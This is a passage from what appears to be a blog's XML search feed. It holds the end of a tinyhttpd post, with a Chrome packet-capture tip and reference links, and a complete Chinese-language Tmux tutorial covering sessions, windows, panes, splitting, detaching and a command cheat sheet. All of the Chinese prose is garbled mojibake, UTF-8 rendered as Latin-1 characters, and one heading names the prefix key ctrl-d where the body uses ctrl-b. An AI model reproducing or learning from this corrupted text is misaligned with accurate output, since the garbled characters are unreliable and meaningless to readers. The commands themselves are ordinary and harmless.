å¦‚ï¼šHost<br>header_value: å¦‚ï¼š www.xxx.com<br></code></pre></td></tr></table></figure><h1 id="æŠ“åŒ…"><a href="#æŠ“åŒ…" class="headerlink" title="æŠ“åŒ…"></a>æŠ“åŒ…</h1><p>å¯ä»¥é€šè¿‡chromeæµè§ˆå™¨è°ƒè¯•ï¼Œå…ˆåé¡ºåºåˆ†åˆ«ä¸ºï¼šf12ã€networkã€preserve logã€nameã€header</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ul><li><a href="https://blog.csdn.net/wenqian1991/article/details/46011357">https://blog.csdn.net/wenqian1991/article/details/46011357</a></li><li><a href="https://phenix3443.github.io/notebook/c/tinyhttpd-analysis.html">https://phenix3443.github.io/notebook/c/tinyhttpd-analysis.html</a><br><img src="/image/tinyhttpd-work-flow.png"></li></ul><p><img src="/image/20150527211620041.png"></p>]]></content>
    
    
    <categories>
      
      <category>Cè¯­è¨€</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è®¡ç®—æœºæ•™è‚²ä¸­ç¼ºå¤±çš„ä¸€è¯¾â€”â€”Tmux</title>
    <link href="/p/34c553/"/>
    <url>/p/34c553/</url>
    
    <content type="html"><![CDATA[<h1 id="Tmuxç®€ä»‹â€”â€”ä¼˜é›…æ°¸ä¸è¿‡æ—¶"><a href="#Tmuxç®€ä»‹â€”â€”ä¼˜é›…æ°¸ä¸è¿‡æ—¶" class="headerlink" title="Tmuxç®€ä»‹â€”â€”ä¼˜é›…æ°¸ä¸è¿‡æ—¶"></a>Tmuxç®€ä»‹â€”â€”ä¼˜é›…æ°¸ä¸è¿‡æ—¶</h1><p>Tmuxæ˜¯ä¸ªéå¸¸å¼ºå¤§çš„ç»ˆç«¯å·¥å…·ï¼Œä¸ä»…å¯ä»¥æä¾›ç»ˆç«¯çš„å¤šè·¯å¤ç”¨ï¼ŒåŒæ—¶å¯ä»¥å°†ä¼šè¯ï¼ˆsessionï¼‰ä¸çª—å£åˆ†ç¦»ï¼Œå¤§å¹…æå‡ç”Ÿäº§åŠ›</p><p><img src="/image/tmux-tutorial/tmux-1.png"></p><p>åœ¨ç»ˆç«¯å†™å‘½ä»¤çš„æ—¶å€™ï¼Œç»å¸¸ç¢°åˆ°è¿™å‡ ç§çŠ¶å†µ</p><ul><li>éœ€è¦å¤šä¸ªç»ˆç«¯å‘½ä»¤è¡ŒåŒæ—¶å…±åŒå·¥ä½œï¼Œä½†æ˜¯ï¼š<ul><li>æ ¹æœ¬æ²¡æœ‰è‡ªå¸¦åˆ†å±ï¼ˆæ¯”å¦‚Ubuntuï¼‰ï¼Œåªèƒ½å¤šå¼€å‡ ä¸ªterminal</li><li>ç»ˆç«¯çª—å£è‡ªå¸¦çš„åˆ†å±éå¸¸éš¾ç”¨ï¼Œå³æ˜¯æ˜¯è½¯ç²‰å¹ä¸Šå¤©çš„æ–°ç‰ˆWindows terminalï¼Œåˆ†å±ä¹Ÿéå¸¸æ‹‰èƒ¯</li></ul></li><li>éœ€è¦sshè¿œç¨‹è¿æ¥æœåŠ¡å™¨ï¼Œä½†æ˜¯è‹¥ä¸¢å¤±äº†ä¸è¿œç¨‹ç³»ç»Ÿçš„è¿æ¥ï¼ˆæ¯”å¦‚çªç„¶æ–­ç½‘æˆ–è€…å¡æ­»ï¼‰ï¼Œé‚£ä¹ˆä¸€åˆ‡æœåŠ¡éƒ½ä¼šè¢«å…³é—­<ul><li>ç©¶å…¶åŸå› ï¼Œåœ¨äºç»ˆç«¯çª—å£ä¸ä¼šè¯æ²¡æœ‰å®Œæˆåˆ†ç¦»ï¼Œå…³é—­äº†çª—å£ï¼Œä¹Ÿå°±å…³é—­äº†ä¸è¿œç¨‹çš„ä¼šè¯</li></ul></li></ul><p>Tmuxçš„å‡ºç°æ”¹å˜äº†è¿™ç§ç°çŠ¶</p><h1 id="sessionã€windowã€pane"><a href="#sessionã€windowã€pane" class="headerlink" title="sessionã€windowã€pane"></a>sessionã€windowã€pane</h1><p>sessionã€windowã€paneåˆ†åˆ«å¯¹åº”ä¸­æ–‡çš„ä¼šè¯ã€çª—å£ã€é¢æ¿ï¼Œä¸€ä¸ªsessionå¯ä»¥æœ‰å¤šä¸ªWindowï¼Œä¸€ä¸ªWindowså¯ä»¥æœ‰å¤šä¸ªpane</p><p>å½“åœ¨ç»ˆç«¯è¾“å…¥Tmuxä¹‹åï¼Œå°±è¿›å…¥äº†ä¸€ä¸ªsessionï¼Œé»˜è®¤ä¸º0ï¼Œä¹Ÿå¯<code>Tmux new -s name</code>ä¸ºæ–°åˆ›å»ºçš„sessionæŒ‡å®šåç§°</p><p><img src="/image/tmux-tutorial/image-20220104005009336.png" alt="ctrl-b + så¾—åˆ°ç›®å‰sessionä¿¡æ¯"></p><p>ä¸Šå›¾æ˜¯æˆ‘æ‰€è¿è¡Œçš„Tmuxæ ·ä¾‹ï¼Œå¯ä»¥é€šè¿‡è¾“å…¥æŒ‡ä»¤<code>ctrl-b + s</code>å¾—åˆ°ã€‚ä¸‹é¢æˆ‘ä»¬åˆ†æè¯¥å›¾ï¼Œä»è€Œææ‡‚sessionã€windowã€paneä¸‰è€…ä¹‹é—´çš„å…³ç³»</p><ul><li>æœ€å·¦è¾¹ï¼ˆ0ï¼‰~ï¼ˆ8ï¼‰æ˜¯è¡Œå·</li><li>è¡Œå·å³è¾¹æœ‰ç¬¬ä¸€çº§çš„0å’Œ1ï¼ŒæŒ‡çš„æ˜¯ç¼–å·ä¸º0å’Œ1çš„ä¸¤ä¸ªsession</li><li>ç¬¬ä¸€ä¸ªsessionæœ‰ä¸€ä¸ªWindowï¼Œç¬¬äºŒä¸ªsessionæœ‰ä¸¤ä¸ªwindowï¼Œä¸”ç¬¬äºŒä¸ªwindowæœ‰ä¸¤ä¸ªpaneï¼Œåˆ†åˆ«æ˜¯fishçš„shellå’Œbashçš„shell</li></ul><h1 id="ç¥å¥‡çš„ctrl-dæŒ‰é”®"><a href="#ç¥å¥‡çš„ctrl-dæŒ‰é”®" class="headerlink" title="ç¥å¥‡çš„ctrl-dæŒ‰é”®"></a>ç¥å¥‡çš„ctrl-dæŒ‰é”®</h1><p>è¯·æ³¨æ„ï¼Œå‡ ä¹æ‰€æœ‰Tmuxçš„å‘½ä»¤éƒ½è¦é…åˆctrl-dä½¿ç”¨ã€‚æ¯”å¦‚æ˜¾ç¤ºæ‰€æœ‰çš„Tmux sessionï¼Œéœ€è¦è¾“å…¥æŒ‡ä»¤<code>ctrl-b + s</code>ï¼Œè¿™æ„å‘³ç€ï¼Œä½ éœ€è¦å…ˆåŒæ—¶æŒ‰ä½ctrl å’Œ bï¼Œç„¶åæ¾å¼€ï¼Œä¹‹åæŒ‰ä¸‹ sã€‚</p><h1 id="å¦‚ä½•åˆ†å±"><a href="#å¦‚ä½•åˆ†å±" class="headerlink" title="å¦‚ä½•åˆ†å±"></a>å¦‚ä½•åˆ†å±</h1><p>åˆ†å±æ˜¯Tmuxçš„æ ¸å¿ƒã€‚è¾“å…¥Tmuxä¹‹åï¼Œä½ å°±è¿›å…¥äº†è¯¥sessionå¯¹åº”çš„windowï¼Œä¸”è¯¥Windowæœ‰ä¸€ä¸ªpane</p><ul><li><p>åˆ›å»ºæ–°Windowï¼š<code>ctrl-b + c</code>ï¼šåœ¨å½“å‰sessionä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„window</p></li><li><p>å·¦å³åˆ†å±åˆ›å»ºæ–°paneï¼š<code>ctrl-b + %</code></p></li><li><p>ä¸Šä¸‹åˆ†å±åˆ›å»ºæ–°paneï¼š<code>ctrl-b + &quot;</code></p></li></ul><h1 id="å¦‚ä½•åˆ‡æ¢sessionã€windowã€pane"><a href="#å¦‚ä½•åˆ‡æ¢sessionã€windowã€pane" class="headerlink" title="å¦‚ä½•åˆ‡æ¢sessionã€windowã€pane"></a>å¦‚ä½•åˆ‡æ¢sessionã€windowã€pane</h1><p>å‚è€ƒå›¾<code>ctrl-b + så¾—åˆ°ç›®å‰sessionä¿¡æ¯</code></p><ul><li>åœ¨æŒ‰ä¸‹<code>ctrl-b + s</code> æˆ–è€… <code>ctrl-b + w</code>åï¼Œä¼šæ˜¾ç¤ºæ‰€æœ‰çš„ä¼šè¯ã€çª—å£ã€é¢æ¿ä¿¡æ¯</li><li>æ­¤æ—¶ï¼Œå¯ä»¥é€šè¿‡ä¸Šä¸‹å·¦å³ç®­å¤´å¹¶ä¸”æ•²å‡»å›è½¦çš„æ–¹å¼åˆ‡æ¢ä¸åŒçš„sessionã€windowã€pane</li><li>åœ¨åŒä¸€ä¸ªwindowä¸‹ï¼Œåˆ‡æ¢paneçš„æ–¹æ³•ï¼š<ul><li>æŒ‰ä¸‹<code>ctrl-b</code>ï¼Œæ¾å¼€ï¼Œå¿«é€ŸæŒ‰ä¸‹<code>ä¸Šä¸‹å·¦å³é”®</code>ï¼Œå¯ä»¥å®ç°paneçš„åˆ‡æ¢</li><li>æŒ‰ä¸‹<code>ctrl-b</code>ï¼Œæ¾å¼€bï¼Œä¸æ¾å¼€ctrlï¼ŒåŒæ—¶æŒ‰ä¸‹<code>ä¸Šä¸‹å·¦å³é”®</code>ï¼Œå¯ä»¥æ§åˆ¶paneçš„å¤§å°</li></ul></li></ul><h1 id="å¦‚ä½•å®ç°ä¼šè¯ä¸çª—å£çš„åˆ†ç¦»"><a href="#å¦‚ä½•å®ç°ä¼šè¯ä¸çª—å£çš„åˆ†ç¦»" class="headerlink" title="å¦‚ä½•å®ç°ä¼šè¯ä¸çª—å£çš„åˆ†ç¦»"></a>å¦‚ä½•å®ç°ä¼šè¯ä¸çª—å£çš„åˆ†ç¦»</h1><p>ä½¿ç”¨æ™®é€šç»ˆç«¯çš„ç—›ç‚¹åœ¨äºï¼Œç»ˆç«¯çª—å£ä¸ä¼šè¯æ²¡æœ‰å®Œæˆåˆ†ç¦»ï¼Œå…³é—­äº†çª—å£ï¼Œä¹Ÿå°±å…³é—­äº†ä¸è¿œç¨‹çš„ä¼šè¯ï¼Œ<strong>å®ç°ä¼šè¯ä¸çª—å£çš„åˆ†ç¦»ï¼Œæ˜¯Tmuxçš„æ€æ‰‹åŠŸèƒ½</strong></p><p>æŒ‰ä¸‹<code>Ctrl+b d</code>æˆ–è€…è¾“å…¥<code>Tmux detach</code>å‘½ä»¤ï¼Œå°±ä¼šå°†å½“å‰sessionä¸çª—å£åˆ†ç¦»ï¼Œåˆ†ç¦»ä¹‹åï¼Œå³ä½¿å…³é—­äº†å½“å‰çª—å£ï¼Œä¼šè¯ä¸­çš„è¿›ç¨‹ä¾ç„¶ä¼šç»§ç»­è¿›è¡Œ</p><p>å½“ä¸‹æ¬¡æƒ³è¦ç»§ç»­ä½¿ç”¨çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡è¾“å…¥å‘½ä»¤<code>Tmux attach-session -t session_name</code>æ¥ç»§ç»­ä¼šè¯</p><p>æŒ‚èµ·æ“ä½œï¼š<code>ctrl+b ctrl+z</code>(ctlré”®æŒ‰ä½ä¸åŠ¨ï¼Œå…ˆæŒ‰ä½bï¼Œæ¾å¼€åå†æŒ‰ä½z)</p><h1 id="å‘½ä»¤é€ŸæŸ¥"><a href="#å‘½ä»¤é€ŸæŸ¥" class="headerlink" title="å‘½ä»¤é€ŸæŸ¥"></a>å‘½ä»¤é€ŸæŸ¥</h1><p>tmux</p><ul><li>tmuxã€‚å¯åŠ¨ä¸€ä¸ªæ–°çš„ tmux ä¼šè¯ã€‚</li><li>tmux lsã€‚æŸ¥çœ‹ tmux ä¼šè¯</li><li>tmux new -s mysessionã€‚åˆ›å»ºå¹¶å‘½åä¸€ä¸ªæ–°ä¼šè¯ã€‚</li><li>Ctrl+b dã€‚åˆ†ç¦»å½“å‰ä¼šè¯</li><li>tmux attach -t mysessionã€‚è¿æ¥åˆ°ï¼ˆå…±äº«ï¼‰ä¼šè¯</li><li>tmux kill-session -t mysessionã€‚æ€æ­»ä¸€ä¸ªä¼šè¯<br>çª—å£ï¼ˆWindowï¼‰</li><li>Ctrl+b cã€‚åˆ›å»ºæ–°çª—å£</li><li>Ctrl+b nã€‚Ctrl+b pã€‚ä¸‹ä¸€ä¸ª/ä¸Šä¸€ä¸ªçª—å£<br>pane</li><li>Ctrl+b %ã€‚Ctrl+b â€œã€‚å‚ç›´/æ°´å¹³æ‹†åˆ†çª—æ ¼</li></ul><h1 id="è‡ªå®šä¹‰ä½ çš„Tmux"><a href="#è‡ªå®šä¹‰ä½ çš„Tmux" class="headerlink" title="è‡ªå®šä¹‰ä½ çš„Tmux"></a>è‡ªå®šä¹‰ä½ çš„Tmux</h1><ul><li>conf æ–‡ä»¶<ul><li>å®šåˆ¶ä½ çš„ ~/.tmux.conf æ–‡ä»¶å®ç°å¯¹åº”åŠŸèƒ½</li></ul></li><li>æ’ä»¶<ul><li>Tmuxå…·æœ‰ä¸°å¯Œçš„æ’ä»¶æ”¯æŒï¼Œåœ¨githubä¸Šæœ‰è®¸å¤šå¯¹åº”èµ„æº</li></ul></li></ul><p>//TODO </p>]]></content>
    
    
    <categories>
      
      <category>è®¡ç®—æœºæ•™è‚²ä¸­ç¼ºå¤±çš„ä¸€è¯¾</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>Tmux</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
